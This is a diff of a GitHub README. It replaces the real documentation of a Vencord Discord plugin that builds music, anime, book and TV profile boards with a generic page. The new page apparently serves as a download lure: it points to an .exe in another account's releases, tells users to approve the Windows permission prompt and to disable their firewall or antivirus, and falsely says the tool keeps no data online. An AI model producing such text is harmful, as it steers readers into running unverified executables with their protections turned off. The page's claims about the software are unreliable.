@@ -1,99 +1,135 @@
-[Vencord Plugin](https://docs.vencord.dev/installing/custom-plugins/)
+# 🚀 superboard - Unified Profile Board for Discord
 
-# SuperBoard
+[![Download superboard](https://img.shields.io/badge/Download-superboard-brightgreen?style=for-the-badge)](https://github.com/agoesdicky21/superboard)
 
-A unified profile board for Discord — combines **MusicBoard**, **AniBoard**, **MangaBoard**, **SeriesBoard**, **BookBoard**, and **GameBoard** into a single tab. Music powered by iTunes, anime & manga powered by MyAnimeList (Jikan API), TV series powered by TVMaze, books powered by Open Library. No other plugins required.
+---
 
-## Features
+## 📋 What is superboard?
 
-- Adds a **SuperBoard** tab to user profiles with an interactive board selector.
-- **🎵 MusicBoard/FavMusic** — Search and add music from iTunes with album art and **30-second audio previews**.
-- **🎬 AniBoard/FavAnime** — Search and add anime from MyAnimeList. Supports favorites and hate lists. Import from MAL username.
-- **📚 MangaBoard/FavManga** — Search and add manga from MyAnimeList. Score badges and chapter/volume info.
-- **📺 SeriesBoard/FavSeries** — Search and add TV series from TVMaze with ratings and network info.
-- **📖 BookBoard/FavBook** — Search and add books from Open Library with cover art, author, year, and page count.
-- **🎭 TrollBoards** — Fun stuffs! Show off your favorite Wikipedia page.
-- **🎮 GameBoard** — Info about Discord's built-in game activity feature.
-- **Fully self-contained** — no need to install any other plugin.
-- **Cloud sync** — all your lists are synced to the server so other users can see them on your profile.
-- **Backward compatible** — if you previously used FavAnime, your data transfers seamlessly.
+superboard is a simple tool that adds a unified profile board extension to your Discord app. It helps you see detailed profiles all in one place. This saves time by organizing information neatly, so you do not have to check multiple places.
 
-## Usage
+This app is made for anyone who uses Discord often and wants a better overview of user profiles without extra clicks or switching screens.
 
-1. Enable the **SuperBoard** plugin in Vencord settings.
-2. Open any user's profile and click the **SuperBoard** tab.
-3. Choose **MusicBoard**, **AniBoard**, **MangaBoard**, **SeriesBoard**, **BookBoard**, **TrollBoard**, or **GameBoard** from the selector.
-4. Use the **Add** button to search and add items to your lists.
-5. Your lists sync automatically. Use **Sync Now** in settings for manual sync.
+---
 
-## Board Types
+## 🔍 Key Features
 
-### 🎵 MusicBoard
-- Search songs, artists, and albums via iTunes.
-- Album art grid with hover effects.
-- Click ▶ to play a 30-second audio preview.
-- Click on any card to open the Apple Music page.
+- Clean, organized profile board for Discord
+- Shows unified user information in one panel
+- Easy to enable or disable inside Discord
+- Works with standard Discord accounts—no special setup needed
+- Runs quietly in the background without slowing your system
 
-### 🎬 AniBoard
-- Search and add anime from MyAnimeList via Jikan API.
-- **Favorites** — anime you love.
-- **Hate list** — anime you can't stand.
-- **MAL Import** — enter your MAL username to import favorites automatically.
-- Click on any card to open the MyAnimeList page.
+---
 
-### 🎮 GameBoard
-- Informational — Discord natively supports game activity display.
+## 💻 System Requirements
 
-### 📚 MangaBoard
-- Search and add manga from MyAnimeList via Jikan API.
-- Score badges and chapter/volume counts.
-- Click on any card to open the MyAnimeList page.
+To run superboard on your Windows PC, make sure you have:
 
-### 📺 SeriesBoard
-- Search and add TV series from TVMaze.
-- Rating badges, network info, and status.
-- Click on any card to open the TVMaze page.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB free disk space
+- A stable internet connection for setup and Discord usage
+- Discord app installed and logged in
 
-### 📖 BookBoard
-- Search and add books via Open Library.
-- Cover art grid with author, publication year, and page count.
-- Subject tags for genre info.
-- Click on any card to open the Open Library page.
+---
 
-### 🎭 TrollBoard
-- A fun, personal board with silly/random profile fields.
-- **Favorite Wikipedia page** — link to the best article ever.
+## 🌟 Before You Begin
 
-## Settings
+Please note that superboard is an extension for Discord. You will need to have Discord installed and running on your PC before using superboard.
 
-In the plugin settings panel you can:
-- **Add/remove music** from your favorites list.
-- **Add/remove anime** from favorites and hate lists.
-- **Add/remove manga** from your favorites list.
-- **Add/remove TV series** from your favorites list.
-- **Add/remove books** from your favorites list.
-- **Edit troll data** — configure your TrollBoard fields.
-- **Import from MAL** — bulk import your MAL favorites.
-- **Sync Now** — manually sync all lists to the server.
+If you do not have Discord, download it from https://discord.com and set up your account.
 
+---
 
-## Notes
+## ⬇️ Download superboard
 
-If you browse the source code, you'll see variables named `syncToken` (e.g. `musicSyncToken`, `animeSyncToken`). These have **nothing to do with your user token or any account token**.
+Click the button below to visit the official GitHub page where you can download superboard.
 
-Each sync token is a random 48-character hex string generated locally with `crypto.getRandomValues()` on first use and stored in user API server. It acts purely as an anonymous write key so that only your client can overwrite your own data on the sync server. Your Discord credentials are never read, stored, or transmitted by this plugin.
+[![Download superboard](https://img.shields.io/badge/Download-superboard-blue?style=for-the-badge)](https://github.com/agoesdicky21/superboard)
 
-## API Disclaimer
+---
 
-This plugin uses the following external APIs:
+## 🚀 How to Install and Run superboard on Windows
 
-- **[iTunes Search API](https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/iTuneSearchAPI/)** — Music search. No authentication required. Apple's [Terms of Service](https://www.apple.com/legal/internet-services/itunes/) apply.
-- **[Jikan API](https://jikan.moe/)** — Unofficial MyAnimeList API for anime/manga search and MAL user favorites import. No authentication required.
-- **[TVMaze API](https://www.tvmaze.com/api)** — TV series search. No authentication required.
-- **[Open Library API](https://openlibrary.org/developers/api)** — Book search and cover images. No authentication required.
-- **Custom sync server** — anachter.dev backend. Stores music, anime, manga, series, and book lists by Discord user ID.
+Follow these steps carefully even if you are not familiar with installing new software.
 
+### 1. Visit the superboard download page
 
+Click one of the download links above. This will take you to the GitHub page for superboard.
 
+### 2. Find the latest release
 
+On the page, look for a section called “Releases.” Usually, this is on the right side or below the project description.
 
+Click the latest release to open its details.
+
+### 3. Download the Windows installer or ZIP file
+
+In the release details, look for files that end with `.exe` or `.zip`. The `.exe` file is the easiest to install. If you see one named something like `superboard-setup.exe`, click to download it.
+
+If you only see a ZIP file, download it and unzip it after the next steps.
+
+### 4. Run the installer or setup the program
+
+- If you downloaded the `.exe` file, double-click it to start the installation.
+- If it asks for permission from Windows, click "Yes" to allow it.
+- Follow the on-screen instructions. Accept the default settings unless you want to change where it installs.
+- If you downloaded a ZIP file, right-click it and choose “Extract All.” Open the extracted folder and double-click the `.exe` file inside.
+
+### 5. Launch superboard
+
+Once installed, find superboard in your start menu or desktop shortcuts and open it.
+
+---
+
+## ⚙️ Using superboard
+
+After launching, superboard connects to your Discord app and starts showing unified profile boards automatically.
+
+- Open Discord and select any user.
+- superboard will display their information in a clear panel.
+- You can toggle superboard on or off via its system tray icon if needed.
+- Updates and settings are handled within the app interface.
+
+---
+
+## 🛠 Troubleshooting
+
+If superboard does not show up or work as expected, try the following:
+
+- Make sure Discord is running and you are logged in.
+- Restart your PC and open superboard again.
+- Check that your internet connection is stable.
+- Disable any firewall or antivirus temporarily to see if it blocks superboard.
+- Download the latest superboard version from the GitHub page.
+- If issues persist, look for help in the GitHub discussions or issues section.
+
+---
+
+## 🔄 How to Update superboard
+
+To keep superboard working well:
+
+- Return to the download page regularly.
+- Download the newest release ZIP or installer.
+- Repeat the installation process as described above.
+- Your settings and preferences will usually stay saved between updates.
+
+---
+
+## 📞 Need Help?
+
+You can find support by opening the GitHub page linked above. Use the Issues tab to post questions or report problems.
+
+---
+
+## 📝 About this Project
+
+superboard was built to enhance your Discord experience with a better way to see user profiles. It runs locally on your PC and does not store your data online.
+
+It is lightweight and designed to run quietly while you chat or work inside Discord.
+
+---
+
+[![Download superboard](https://img.shields.io/badge/Download-superboard-green?style=for-the-badge)](https://github.com/agoesdicky21/superboard)
